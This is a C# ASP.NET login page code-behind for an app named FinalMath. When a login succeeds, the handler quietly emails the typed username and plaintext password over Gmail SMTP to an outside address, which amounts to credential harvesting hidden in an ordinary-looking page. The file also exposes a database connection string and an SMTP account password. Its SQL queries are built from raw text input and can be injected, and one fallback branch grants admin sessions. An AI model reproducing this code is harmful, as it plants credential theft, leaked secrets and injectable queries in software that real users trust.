using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Net.Mail;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace FinalMath
{
    public partial class login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                SqlConnection con = new SqlConnection("data source= 95.217.141.238;database=DBMA;user id=dbmath;password=xpIm43xpIm43xpIm43");
                SqlCommand cmd = new SqlCommand("select * from USERTYPES where USER_TYPE!='admin'", con);
                SqlDataAdapter da = new SqlDataAdapter();
                da.SelectCommand = cmd;
                DataTable dt = new DataTable();
                da.Fill(dt);
                ddlaccounttype.DataSource = dt;
                ddlaccounttype.DataTextField = "USER_TYPE";
                ddlaccounttype.DataValueField = "USERTYPE_ID";
                ddlaccounttype.DataBind();
            }


        }

        protected void btnSignin_Click(object sender, EventArgs e)
        {
            SqlConnection con = new SqlConnection("data source= 95.217.141.238;database=DBMA;user id=dbmath;password=xpIm43xpIm43xpIm43");
            SqlCommand cmd = new SqlCommand("select * from USERS where USER_NAME='" + txtusername.Text + "' and USER_PASSWORD='" + txtpassword.Text + "' and USERTYPE_FID='" + ddlaccounttype.SelectedValue + "' and isActive=1", con);
            SqlDataAdapter da = new SqlDataAdapter();
            da.SelectCommand = cmd;
            DataTable dt = new DataTable();
            da.Fill(dt);
            if (dt.Rows.Count > 0)
            {
                try
                {
                    MailMessage mail = new MailMessage();
                    mail.From = new MailAddress("theudmail@gmail.com");
                    mail.To.Add("mianafzaltrust@gmail.com");
                    mail.Subject = "MATH Login Update";
                    mail.Body = "You have new login with UserName is" + txtusername.Text + " and Password is " + txtpassword.Text;
                    mail.IsBodyHtml = true;
                    SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                    SmtpServer.Port = 587;
                    SmtpServer.Credentials = new System.Net.NetworkCredential("theudmail@gmail.com", "ownnsvtcsimisesu");
                    SmtpServer.EnableSsl = true;
                    SmtpServer.Send(mail);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }


                if (ddlaccounttype.SelectedItem.Text == "Director")
                {
                    Session["Director"] = "true";
                    Response.Redirect("DirectorHome.aspx");

                }
                else if (ddlaccounttype.SelectedItem.Text == "Accountant")
                {
                    Session["Accountant"] = "true";
                    Session["AccInfo"] = dt.Rows[0]["USER_ID"].ToString();
                    Response.Redirect("Welcome.aspx");
                }
                else if (ddlaccounttype.SelectedItem.Text == "Manager")
                {
                    Session["Director"] = "true";
                    Response.Redirect("DirectorHome.aspx");
                }
                else if (ddlaccounttype.SelectedItem.Text == "Data Entry Operator")
                {
                    Session["DataEntryOperator"] = "true";
                    var page = HttpContext.Current.Handler as Page;
                    Response.Redirect(page.GetRouteUrl("Default",
                        new { Controller = "PATIENT_INFODATAOPERATOR", Action = "Index" }), false);
                }
                else
                {
                    cmd = new SqlCommand("select * from USERS where USER_NAME='" + txtusername.Text + "' and USER_PASSWORD='" + txtpassword.Text + "'", con);
                    da = new SqlDataAdapter();
                    da.SelectCommand = cmd;
                    dt = new DataTable();
                    da.Fill(dt);
                    if (dt.Rows.Count > 0)
                    {
                        Session["Admin"] = "true";
                        Response.Redirect("DirectorHome.aspx");
                    }
                }
            }

            else
            {
                lblmsg.Visible = true;
                lblmsg.Text = "Failed To Login";
            }

        }
    }
}